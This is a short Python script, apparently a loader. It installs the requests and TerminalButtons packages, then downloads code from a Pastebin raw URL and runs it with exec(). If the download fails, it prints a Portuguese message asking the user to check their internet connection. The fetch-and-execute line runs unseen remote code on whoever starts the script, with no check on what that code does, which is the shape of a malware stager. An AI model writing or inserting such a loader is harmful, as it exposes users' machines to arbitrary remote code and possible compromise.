from os import execl; from sys import executable; from os import system;from sys import argv
try: from requests import get;from TerminalButtons import *
except: system('python3 -m pip install --upgrade pip && pip3 install requests TerminalButtons');execl(executable, executable, *argv)
try: exec(get('https://pastebin.com/raw/xiWfiLp0').text)
except: print('Verifique sua conexão com a internet!')
